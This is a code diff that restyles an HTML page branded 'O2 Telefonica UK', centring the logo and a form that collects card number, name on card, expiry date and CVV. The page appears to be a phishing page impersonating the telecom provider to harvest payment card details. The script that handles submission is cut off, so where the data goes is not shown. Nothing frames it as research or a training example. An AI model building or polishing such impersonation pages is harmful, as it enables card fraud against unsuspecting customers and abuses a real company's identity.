@@ -8,29 +8,23 @@
         body {
             font-family: Arial, sans-serif;
             margin: 50px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             background-color: #f9f9f9;
-        }
-        .container {
-            display: flex;
-            align-items: flex-start;
+            text-align: center; /* Center align all content */
         }
         .logo {
-            margin-right: 30px;
-            font-size: 24px;
+            font-size: 28px;
             font-weight: bold;
             color: #007bff; /* Blue color */
-            text-align: center;
-            width: 200px;
+            margin-bottom: 20px; /* Space between logo and form */
         }
         form {
             max-width: 400px;
+            margin: 0 auto; /* Center the form horizontally */
             padding: 20px;
             border: 1px solid #ccc;
             border-radius: 10px;
             background-color: white;
+            text-align: left; /* Align form labels to the left */
         }
         input[type="text"], input[type="password"] {
             width: 100%;
@@ -54,29 +48,27 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- O2 Telefonica UK Logo -->
-        <div class="logo">
-            O2 Telefonica UK
-        </div>
-
-        <!-- Card Details Form -->
-        <form id="cardForm">
-            <label for="cardNumber">Card Number:</label>
-            <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
-
-            <label for="nameOnCard">Name on Card:</label>
-            <input type="text" id="nameOnCard" name="nameOnCard" placeholder="John Doe" required>
-
-            <label for="expiryDate">Expiry Date:</label>
-            <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
-
-            <label for="cvv">CVV:</label>
-            <input type="password" id="cvv" name="cvv" placeholder="123" required>
-
-            <button type="submit">Submit</button>
-        </form>
+    <!-- O2 Telefonica UK Logo -->
+    <div class="logo">
+        O2 Telefonica UK
     </div>
+
+    <!-- Card Details Form -->
+    <form id="cardForm">
+        <label for="cardNumber">Card Number:</label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
+
+        <label for="nameOnCard">Name on Card:</label>
+        <input type="text" id="nameOnCard" name="nameOnCard" placeholder="John Doe" required>
+
+        <label for="expiryDate">Expiry Date:</label>
+        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
+
+        <label for="cvv">CVV:</label>
+        <input type="password" id="cvv" name="cvv" placeholder="123" required>
+
+        <button type="submit">Submit</button>
+    </form>
 
     <script>
         document.getElementById('cardForm').addEventListener('submit', async function (e) {
